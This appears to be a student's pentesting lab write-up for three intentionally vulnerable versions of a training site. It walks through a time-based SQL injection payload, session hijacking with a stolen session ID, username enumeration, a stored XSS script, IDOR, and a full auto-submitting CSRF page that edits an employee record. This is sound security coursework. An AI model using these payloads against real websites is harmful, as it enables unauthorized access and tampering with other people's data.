# Project 8 - Pentesting Live Targets

Time spent: **4** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

**Vulnerability #1:** SQL Injection (SQLi)
![Inject this code instead of ID of a salesperson](./1.png)
  ```
  %27%20OR%20SLEEP(5)=0--%27
  ```
* Website will halt for five seconds because of our code

**Vulnerability #2:** Session Hijacking/Fixation

* Get victim's session ID from the hacktool
![Session Hijacking 1](./2.png)
* Open up the website on your side and direct yourself to /index.php (Make sure intercept is on)
![Session Hijacking 2](./3.png)
![Session Hijacking 3](./4.png)
* Change Session ID value to one that we just stole
![Session Hijacking 4](./5.png)
* We are in
![Session Hijacking 5](./6.png)

## Green

**Vulnerability #1:** Username Enumeration

*I want to note that enumeration is not only way to tell if username exists. You can basically guess or use a username of the person from another website, as people try to get the same username on all the websites.*

* Try jmonroeX as your login, where X is a number from 0 to infinity. [I used pperson, because I had this username in my db]
* If username exists, the website will display it as **bold** text.
![Enumeration](./7.png)
![Enumeration](./8.png)

**Vulnerability #2:** Cross-Site Scripting (XSS)

- Send feedback with this code: `<script>alert('Daulet found the XSS!');</script>`
- As soon as admin opens Feedback page, the XSS will be executed.

![XSS](./9.png)

## Red

**Vulnerability #1:** Insecure Direct Object Reference

* Just change the ID of the salesperson until u find those that u were not supposed to
![IDOR1](./10.png)
![IDOR2](./11.png)
![IDOR3](./12.png)

**Vulnerability #2:** CSRF

* Create a malicious website with this code:
```
<html>
  <body onload="document.my_form.submit()">
    <form action="https://104.154.145.74/red/public/staff/salespeople/edit.php?id=1" method="POST" name="hackform" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="Rick" />
      <input type="text" name="last_name" value="Astley" />
      <input type="text" name="phone" value="123-456-7890" />
      <input type="text" name="email" value="hackermail@protonmail.com" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```
* Supply this link via feedback to admins
* As soon as admin proceeds to the website, he will change the values of employee with ID=1
